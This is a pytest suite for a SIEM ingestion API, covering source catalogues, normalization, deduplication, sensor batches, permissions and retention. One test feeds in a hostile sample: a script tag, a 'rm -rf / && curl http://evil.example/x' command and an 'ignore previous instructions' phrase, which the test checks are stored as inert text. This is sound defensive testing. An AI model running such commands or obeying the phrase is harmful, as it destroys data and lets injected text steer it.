"""Fase 7F.1: catálogo de fuentes SIEM, contrato normalizado, pipeline de ingesta y seguridad.

Los registros de estas pruebas son SINTÉTICOS (escritos a mano con el contrato
sentra.siem.event v1); no representan ningún producto externo.
"""

import json
import uuid
from collections.abc import Iterator
from datetime import UTC, datetime, timedelta
from typing import Any

import pytest
from fastapi.testclient import TestClient
from sqlalchemy import Engine, func, select, update
from sqlalchemy.orm import Session, sessionmaker

from app.core.config import get_settings
from app.models.audit import AuditEvent
from app.models.siem import SiemBatch, SiemEvent, SiemSource
from app.siem.retention import purge_siem
from tests.conftest import authenticate
from tests.test_sites_sensors import (
    CAPS,
    SensorSim,
    _error,
    _ok,
    create_site,
    default_site,
    enroll,
    new_token,
)

API = "/api/v1"
SIEM = f"{API}/siem"
SIEM_CAP = "siem.ingest"


@pytest.fixture
def db(engine: Engine, client: TestClient) -> Iterator[Session]:
    with sessionmaker(bind=engine, expire_on_commit=False)() as session:
        yield session


def siem_sensor(client: TestClient, site_id: str, name: str = "siem-sensor") -> SensorSim:
    sensor = SensorSim.__new__(SensorSim)
    sensor.client = client
    body = _ok(enroll(client, new_token(client, site_id, name), [*CAPS, SIEM_CAP], "0.9.0"), 201)
    sensor.credential = body["credential"]
    sensor.sensor_id = body["sensor_id"]
    sensor.site_id = site_id
    sensor.config = body["config"]
    return sensor


def upload_source(
    client: TestClient, name: str = "import", enabled: bool = True, **extra: Any
) -> dict[str, Any]:
    body = {
        "site_id": default_site(client)["site_id"],
        "name": name,
        "source_type": "sentra_json",
        "transport": "upload",
        "enabled": enabled,
        **extra,
    }
    source: dict[str, Any] = _ok(client.post(f"{SIEM}/sources", json=body), 201)
    return source


def sensor_source(
    client: TestClient, sensor: SensorSim, name: str = "fw", alias: str = "jsonl", **extra: Any
) -> dict[str, Any]:
    body = {
        "site_id": sensor.site_id,
        "name": name,
        "source_type": "sentra_json",
        "transport": "sensor",
        "sensor_id": sensor.sensor_id,
        "input_name": alias,
        "enabled": True,
        **extra,
    }
    source: dict[str, Any] = _ok(client.post(f"{SIEM}/sources", json=body), 201)
    return source


def event(**overrides: Any) -> dict[str, Any]:
    value: dict[str, Any] = {
        "event_type": "firewall.deny",
        "category": "network",
        "timestamp": (datetime.now(UTC) - timedelta(minutes=2)).isoformat(),
        "severity": "low",
        "source_ip": "10.0.0.5",
        "destination_ip": "10.0.0.9",
        "source_port": 51000,
        "destination_port": 445,
        "protocol": "tcp",
        "action": "deny",
        "outcome": "failure",
        "message": "connection denied",
    }
    value.update(overrides)
    return value


def lines(*events: dict[str, Any]) -> str:
    return "\n".join(json.dumps(e) for e in events)


def import_(client: TestClient, source: dict[str, Any], content: str) -> Any:
    return client.post(
        f"{SIEM}/sources/{source['source_id']}/import",
        json={"content": content, "filename": "export.jsonl"},
    )


def record(raw: str, **overrides: Any) -> dict[str, Any]:
    value: dict[str, Any] = {
        "raw": raw,
        "record_id": f"r-{uuid.uuid4().hex}",
        "collected_at": datetime.now(UTC).isoformat(),
        "transport": "file",
        "file_id": "f1",
        "offset": 0,
    }
    value.update(overrides)
    return value


def batch(
    source: dict[str, Any], records: list[dict[str, Any]], alias: str = "jsonl"
) -> dict[str, Any]:
    return {
        "batch_id": str(uuid.uuid4()),
        "source_id": source["source_id"],
        "input": alias,
        "records": records,
    }


# --- catálogo ---------------------------------------------------------------------------------


def test_connector_catalog_declares_versions_and_transports(client: TestClient) -> None:
    items = _ok(client.get(f"{SIEM}/connectors"))["items"]
    by_type = {c["source_type"]: c for c in items}
    assert "sentra_json" in by_type
    connector = by_type["sentra_json"]
    assert connector["version"]
    assert set(connector["transports"]) == {"upload", "sensor"}
    assert connector["validation"]


def test_new_source_is_disabled_and_never_healthy_by_configuration(client: TestClient) -> None:
    source = upload_source(client, enabled=False)
    assert source["enabled"] is False
    assert source["status"] == "disabled"
    updated = _ok(
        client.put(
            f"{SIEM}/sources/{source['source_id']}",
            json={"expected_revision": source["revision"], "enabled": True},
        )
    )
    # Habilitada pero sin datos: "configured", nunca "healthy".
    assert updated["status"] == "configured"
    assert updated["revision"] == source["revision"] + 1


def test_unknown_connector_and_transport_are_rejected(client: TestClient) -> None:
    site = default_site(client)["site_id"]
    base = {"site_id": site, "name": "x", "transport": "upload"}
    _error(
        client.post(f"{SIEM}/sources", json={**base, "source_type": "splunk"}),
        422,
        "siem_unknown_connector",
    )
    _error(
        client.post(
            f"{SIEM}/sources",
            json={**base, "source_type": "sentra_json", "transport": "sensor"},
        ),
        422,
        "siem_sensor_required",
    )


def test_source_config_rejects_unknown_policy_keys(client: TestClient) -> None:
    site = default_site(client)["site_id"]
    _error(
        client.post(
            f"{SIEM}/sources",
            json={
                "site_id": site,
                "name": "x",
                "transport": "upload",
                "source_type": "sentra_json",
                "config": {"severity_policy": {"9": "critical"}},
            },
        ),
        422,
        "siem_severity_policy_key",
    )


# --- importación y normalización ------------------------------------------------------------------


def test_import_normalizes_and_counts_rejections(client: TestClient, db: Session) -> None:
    source = upload_source(client)
    content = "\n".join(
        [
            json.dumps(event()),
            "{not json",
            json.dumps(event(site_id="other-site")),
            json.dumps(event(category="made-up")),
            json.dumps(event(unexpected="x")),
            "",
        ]
    )
    result = _ok(import_(client, source, content))
    assert result["records"] == 5
    assert result["accepted"] == 1
    assert result["rejected"] == 4
    assert result["reject_reasons"] == {
        "invalid_json": 1,
        "forbidden_field": 1,
        "invalid_schema": 2,
    }
    events = _ok(client.get(f"{SIEM}/events"))
    assert events["total"] == 1
    item = events["items"][0]
    assert item["schema_version"] == 1
    assert item["normalization_version"].startswith("sentra_json/")
    assert item["source_ip"] == "10.0.0.5"
    assert item["destination_port"] == 445
    assert item["time_quality"] == "source"
    assert len(item["evidence_hash"]) == 64
    assert item["raw_reference"].startswith("upload:")
    # Los campos que el registro no trae quedan ausentes, no inventados.
    assert item["username"] is None
    assert item["hostname"] is None
    source_row = _ok(client.get(f"{SIEM}/sources/{source['source_id']}"))
    assert source_row["events_received"] == 5
    assert source_row["events_accepted"] == 1
    assert source_row["events_rejected"] == 4
    assert source_row["status"] == "degraded"
    audit = db.scalars(select(AuditEvent).where(AuditEvent.action == "siem_import")).all()
    assert len(audit) == 1
    assert audit[0].details is not None and audit[0].details["accepted"] == 1


def test_reimport_is_idempotent_and_duplicates_are_counted(client: TestClient) -> None:
    source = upload_source(client)
    content = lines(event(event_id="a-1"), event(event_id="a-2"))
    first = _ok(import_(client, source, content))
    assert first["accepted"] == 2
    again = _ok(import_(client, source, content))
    assert again["duplicate"] is True
    # Otro fichero con un evento ya visto (mismo event_id) y uno nuevo.
    other = _ok(import_(client, source, lines(event(event_id="a-2"), event(event_id="a-3"))))
    assert other["accepted"] == 1
    assert other["duplicates"] == 1
    assert _ok(client.get(f"{SIEM}/events"))["total"] == 3
    source_row = _ok(client.get(f"{SIEM}/sources/{source['source_id']}"))
    assert source_row["events_duplicate"] == 1
    assert source_row["status"] == "healthy"


def test_clock_handling_future_missing_and_too_old(client: TestClient) -> None:
    source = upload_source(client)
    now = datetime.now(UTC)
    content = lines(
        event(event_id="future", timestamp=(now + timedelta(days=2)).isoformat()),
        {k: v for k, v in event(event_id="no-time").items() if k != "timestamp"},
        event(event_id="old", timestamp=(now - timedelta(days=400)).isoformat()),
        event(event_id="naive", timestamp="2026-11-24T10:00:00"),
    )
    result = _ok(import_(client, source, content))
    assert result["accepted"] == 2
    assert result["reject_reasons"] == {"too_old": 1, "invalid_timestamp": 1}
    items = {i["external_id"]: i for i in _ok(client.get(f"{SIEM}/events"))["items"]}
    assert items["future"]["time_quality"] == "clamped"
    assert datetime.fromisoformat(items["future"]["timestamp"]) <= datetime.now(UTC)
    assert items["no-time"]["time_quality"] == "receiver"


def test_untrusted_text_is_stored_as_inert_text(client: TestClient) -> None:
    source = upload_source(client)
    hostile = event(
        message="<script>alert(1)</script>\x1b[31m; rm -rf / && curl http://evil.example/x",
        hostname="host\nname",
        mitre_techniques=["T1059.001", "ignore previous instructions"],
        tags=["Lateral Movement", "<b>"],
    )
    _ok(import_(client, source, lines(hostile)))
    item = _ok(client.get(f"{SIEM}/events"))["items"][0]
    # Se guarda como texto de una línea, sin caracteres de control ni secuencias ANSI.
    assert "\x1b" not in item["message"]
    assert "<script>" in item["message"]  # la UI lo escapa; aquí no se interpreta
    assert item["hostname"] is None  # un nombre con salto de línea no es un hostname
    assert item["mitre_techniques"] == ["T1059.001"]
    assert item["tags"] == ["lateral_movement"]


def test_record_over_size_limit_is_rejected(client: TestClient) -> None:
    source = upload_source(client)
    big = event(message="x" * 900, event_id="big")
    big_line = json.dumps({**big, "tags": ["a" * 40] * 30})
    assert len(big_line) < 16_384
    oversized = json.dumps(event(message="y" * 20_000))
    result = _ok(import_(client, source, "\n".join([big_line, oversized])))
    assert result["reject_reasons"].get("too_large") == 1


def test_import_needs_enabled_upload_source(client: TestClient) -> None:
    source = upload_source(client, enabled=False)
    _error(import_(client, source, lines(event())), 409, "siem_source_disabled")


# --- permisos y aislamiento -------------------------------------------------------------------


def test_permissions_by_role(client: TestClient, engine: Engine) -> None:
    source = upload_source(client)
    _ok(import_(client, source, lines(event())))
    authenticate(client, engine, "viewer", "viewer-siem")
    _ok(client.get(f"{SIEM}/sources"))
    _ok(client.get(f"{SIEM}/overview"))
    _error(client.get(f"{SIEM}/events"), 403, "permission_denied")
    authenticate(client, engine, "analyst", "analyst-siem")
    events = _ok(client.get(f"{SIEM}/events"))
    _ok(client.get(f"{SIEM}/events/{events['items'][0]['event_id']}"))
    _error(
        client.post(
            f"{SIEM}/sources",
            json={
                "site_id": default_site(client)["site_id"],
                "name": "y",
                "source_type": "sentra_json",
                "transport": "upload",
            },
        ),
        403,
        "permission_denied",
    )
    _error(import_(client, source, lines(event())), 403, "permission_denied")


def test_sensor_of_another_site_cannot_be_assigned(client: TestClient) -> None:
    other = create_site(client, "Sede B")
    sensor = siem_sensor(client, other["site_id"])
    _error(
        client.post(
            f"{SIEM}/sources",
            json={
                "site_id": default_site(client)["site_id"],
                "name": "fw",
                "source_type": "sentra_json",
                "transport": "sensor",
                "sensor_id": sensor.sensor_id,
                "input_name": "jsonl",
            },
        ),
        422,
        "siem_sensor_other_site",
    )


def test_site_filter_isolates_events(client: TestClient) -> None:
    other = create_site(client, "Sede C")
    local = upload_source(client, "local-import")
    remote: dict[str, Any] = _ok(
        client.post(
            f"{SIEM}/sources",
            json={
                "site_id": other["site_id"],
                "name": "remote-import",
                "source_type": "sentra_json",
                "transport": "upload",
                "enabled": True,
            },
        ),
        201,
    )
    _ok(import_(client, local, lines(event(event_id="l"))))
    _ok(import_(client, remote, lines(event(event_id="r"))))
    items = _ok(client.get(f"{SIEM}/events", params={"site_id": other["site_id"]}))["items"]
    assert [i["external_id"] for i in items] == ["r"]
    assert items[0]["site_id"] == other["site_id"]


# --- protocolo del sensor ---------------------------------------------------------------------


def test_heartbeat_siem_block_only_for_capable_sensors(client: TestClient) -> None:
    site = default_site(client)["site_id"]
    legacy = SensorSim(client, site, "legacy")
    assert legacy.config.get("siem") is None
    sensor = siem_sensor(client, site)
    config = _ok(sensor.heartbeat())["config"]["siem"]
    assert config["enabled"] is False and config["sources"] == []
    source = sensor_source(client, sensor)
    config = _ok(sensor.heartbeat())["config"]["siem"]
    assert config["enabled"] is True
    assert config["sources"] == [
        {
            "source_id": source["source_id"],
            "input": "jsonl",
            "source_type": "sentra_json",
            "revision": source["revision"],
        }
    ]
    # El servidor nunca envía rutas, puertos ni direcciones: solo alias y límites.
    assert set(config) == {
        "enabled",
        "revision",
        "sources",
        "max_records_per_batch",
        "max_batch_bytes",
        "max_record_bytes",
        "flush_interval_seconds",
        "spool_max_mb",
        "spool_max_age_hours",
    }


def test_sensor_batch_is_accepted_and_deduplicated(client: TestClient, db: Session) -> None:
    sensor = siem_sensor(client, default_site(client)["site_id"])
    source = sensor_source(client, sensor)
    body = batch(source, [record(json.dumps(event(event_id="s-1")), offset=0)])
    result = _ok(sensor.call("/siem/batches", body))
    assert result["accepted"] == 1 and result["duplicate"] is False
    again = _ok(sensor.call("/siem/batches", body))
    assert again["duplicate"] is True
    stored = db.scalars(select(SiemEvent)).all()
    assert len(stored) == 1
    assert stored[0].raw_reference == "jsonl:file:f1@0"
    assert stored[0].sensor_id is not None
    assert db.scalar(select(func.count()).select_from(SiemBatch)) == 1
    row = _ok(client.get(f"{SIEM}/sources/{source['source_id']}"))
    assert row["status"] == "healthy"
    assert row["lag_seconds"] is not None


def test_sensor_cannot_write_to_foreign_or_disabled_source(client: TestClient) -> None:
    site = default_site(client)["site_id"]
    owner = siem_sensor(client, site, "owner")
    intruder = siem_sensor(client, site, "intruder")
    source = sensor_source(client, owner)
    payload = batch(source, [record(json.dumps(event()))])
    _error(intruder.call("/siem/batches", payload), 403, "siem_not_authorized")
    # Alias distinto del aprobado.
    _error(owner.call("/siem/batches", {**payload, "input": "other"}), 403, "siem_not_authorized")
    # Fuente inexistente.
    _error(
        owner.call("/siem/batches", {**payload, "source_id": str(uuid.uuid4())}),
        403,
        "siem_not_authorized",
    )
    _ok(
        client.put(
            f"{SIEM}/sources/{source['source_id']}",
            json={"expected_revision": source["revision"], "enabled": False},
        )
    )
    _error(owner.call("/siem/batches", payload), 403, "siem_not_authorized")


def test_sensor_without_capability_is_rejected(client: TestClient) -> None:
    site = default_site(client)["site_id"]
    sensor = siem_sensor(client, site)
    source = sensor_source(client, sensor)
    _ok(sensor.heartbeat(capabilities=CAPS))
    _error(
        sensor.call("/siem/batches", batch(source, [record(json.dumps(event()))])),
        403,
        "siem_not_authorized",
    )


def test_quota_answers_429_with_retry_after(client: TestClient, db: Session) -> None:
    sensor = siem_sensor(client, default_site(client)["site_id"])
    source = sensor_source(client, sensor, max_events_per_minute=3)
    first = batch(source, [record(json.dumps(event(event_id=f"q{i}"))) for i in range(3)])
    _ok(sensor.call("/siem/batches", first))
    second = batch(source, [record(json.dumps(event(event_id="q9")))])
    response = sensor.call("/siem/batches", second)
    _error(response, 429, "siem_quota")
    assert int(response.headers["Retry-After"]) >= 1
    # El lote rechazado no deja recibo: el sensor lo reintenta igual.
    assert db.scalar(select(func.count()).select_from(SiemBatch)) == 1
    row = _ok(client.get(f"{SIEM}/sources/{source['source_id']}"))
    assert row["last_error_code"] == "siem_quota"
    assert "siem_quota" in row["status_reasons"]


def test_batch_record_limit_and_record_validation(client: TestClient) -> None:
    sensor = siem_sensor(client, default_site(client)["site_id"])
    source = sensor_source(client, sensor)
    too_many = batch(source, [record("{}")] * 1001)
    _error(sensor.call("/siem/batches", too_many), 422, "siem_batch_too_large")
    bad = batch(source, [record("{}", transport="carrier-pigeon")])
    assert sensor.call("/siem/batches", bad).status_code == 422


def test_heartbeat_health_drives_status(client: TestClient, db: Session) -> None:
    sensor = siem_sensor(client, default_site(client)["site_id"])
    source = sensor_source(client, sensor)
    revision = source["revision"]
    _ok(
        sensor.heartbeat(
            capabilities=[*CAPS, SIEM_CAP],
            siem={
                "state": "running",
                "config_revision": revision,
                "inputs": [{"name": "jsonl", "state": "running", "received": 0}],
            },
        )
    )
    row = _ok(client.get(f"{SIEM}/sources/{source['source_id']}"))
    assert row["status"] == "healthy"
    _ok(
        sensor.heartbeat(
            siem={
                "state": "degraded",
                "config_revision": revision,
                "inputs": [
                    {"name": "jsonl", "state": "degraded", "degraded_reasons": ["rate_limited"]}
                ],
            },
        )
    )
    row = _ok(client.get(f"{SIEM}/sources/{source['source_id']}"))
    assert row["status"] == "degraded" and row["status_reasons"] == ["rate_limited"]
    # El alias aprobado no está declarado en el sensor (con la configuración ya aplicada).
    _ok(sensor.heartbeat(siem={"state": "running", "config_revision": revision, "inputs": []}))
    row = _ok(client.get(f"{SIEM}/sources/{source['source_id']}"))
    assert row["status"] == "error"
    # Sin reportes recientes: offline.
    old = datetime.now(UTC) - timedelta(hours=2)
    db.execute(
        update(SiemSource)
        .where(SiemSource.name == "fw")
        .values(reported_at=old, last_success_at=None, reported_state="running")
    )
    db.commit()
    row = _ok(client.get(f"{SIEM}/sources/{source['source_id']}"))
    assert row["status"] == "offline"


def test_delete_requires_disabled_source_and_is_audited(client: TestClient, db: Session) -> None:
    source = upload_source(client)
    _ok(import_(client, source, lines(event())))
    _error(client.delete(f"{SIEM}/sources/{source['source_id']}"), 409, "siem_source_enabled")
    current = _ok(client.get(f"{SIEM}/sources/{source['source_id']}"))
    _ok(
        client.put(
            f"{SIEM}/sources/{source['source_id']}",
            json={"expected_revision": current["revision"], "enabled": False},
        )
    )
    assert client.delete(f"{SIEM}/sources/{source['source_id']}").status_code == 204
    assert db.scalar(select(func.count()).select_from(SiemEvent)) == 0
    actions = set(db.scalars(select(AuditEvent.action)).all())
    assert {"siem_source_created", "siem_source_changed", "siem_source_deleted"} <= actions


def test_stale_revision_is_a_conflict(client: TestClient) -> None:
    source = upload_source(client)
    _error(
        client.put(
            f"{SIEM}/sources/{source['source_id']}",
            json={"expected_revision": source["revision"] + 5, "enabled": False},
        ),
        409,
        "siem_source_changed",
    )


# --- retención ----------------------------------------------------------------------------------


def test_retention_by_source_and_global_cap(client: TestClient, db: Session) -> None:
    short = upload_source(client, "short", retention_days=5)
    keep = upload_source(client, "keep")
    now = datetime.now(UTC)
    _ok(
        import_(
            client,
            short,
            lines(
                event(event_id="s-old", timestamp=(now - timedelta(days=4)).isoformat()),
                event(event_id="s-new"),
            ),
        )
    )
    _ok(import_(client, keep, lines(*[event(event_id=f"k{i}") for i in range(5)])))
    settings = get_settings()
    counts = purge_siem(db, settings, now + timedelta(days=2))
    assert counts["siem_events"] == 1
    remaining = set(db.scalars(select(SiemEvent.external_id)).all())
    assert "s-old" not in remaining and "s-new" in remaining
    db.execute(update(SiemEvent).values(received_at=now))
    db.commit()
    db.execute(func.now().select())  # mantiene la sesión viva
    capped = settings.model_copy(update={"siem_max_stored_events": 3})
    db.connection().exec_driver_sql("ANALYZE siem_events")
    counts = purge_siem(db, capped, now)
    assert counts.get("siem_events_capped") == 3
    assert db.scalar(select(func.count()).select_from(SiemEvent)) == 3
